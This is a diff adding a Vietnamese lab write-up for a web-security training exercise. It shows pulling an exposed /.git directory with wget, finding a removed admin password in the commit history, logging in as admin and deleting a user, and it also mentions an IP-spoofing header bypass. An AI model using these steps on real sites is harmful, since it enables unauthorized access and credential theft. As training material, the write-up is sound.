@@ -125,6 +125,60 @@ X-Custom-IP-Authorization: 127.0.0.1
 ```
 - Ứng dụng sẽ xác nhận rằng request đến từ `127.0.0.1` là request cục bộ, nhầm lẫn là admin nên cho phép truy cập tài nguyên trang **admin**
 
+### Lab: Information disclosure in version control history
+- Truy cập đến `/.git` => Lỗi cấu hình => Lộ file `.git`
+- Tài file `.git` đó về
+
+```zsh
+wget -r https://0a41004e04a009548185fcda0083004e.web-security-academy.net/.git
+```
+- Truy câp đến thư mục `.git` **(chưa có "git" thì lo mà tải đi nhá)**
+- Xem **log** của **repository**
+
+```zsh
+git log
+```
+
+```
+commit f5ebf4a50140e3538a518029f7c9f6ab8318c201 (HEAD -> master)
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Tue Jun 23 14:05:07 2020 +0000
+
+    Remove admin password from config
+
+commit 0591a2262f16349fbc79f83e1588f13877d6afbd
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Mon Jun 22 16:23:42 2020 +0000
+
+    Add skeleton admin panel
+```
+
+- Ta thấy **commit** có id `f5ebf4a50140e3538a518029f7c9f6ab8318c201` đã 
+`Remove admin password from config` => Ta có thể xem sự thay đổi tại commit này để xem **password** bị xóa là gì
+
+```zsh
+git show f5ebf4a50140e3538a518029f7c9f6ab8318c201
+```
+
+```
+commit f5ebf4a50140e3538a518029f7c9f6ab8318c201 (HEAD -> master)
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Tue Jun 23 14:05:07 2020 +0000
+
+    Remove admin password from config
+
+diff --git a/admin.conf b/admin.conf
+index ee7c7c9..21d23f1 100644
+--- a/admin.conf
++++ b/admin.conf
+@@ -1 +1 @@
+-ADMIN_PASSWORD=d0udappaq6625y2dwbi8
++ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+```
+
+- Author đã xóa `ADMIN_PASSWORD=d0udappaq6625y2dwbi8` và thay bằng `ADMIN_PASSWORD=env('ADMIN_PASSWORD')`
+- Đăng nhập bằng tài khoản **admin** với **password** vừa tìm được
+- Xóa uses `carlos`
 
 ## Prevent
 ---
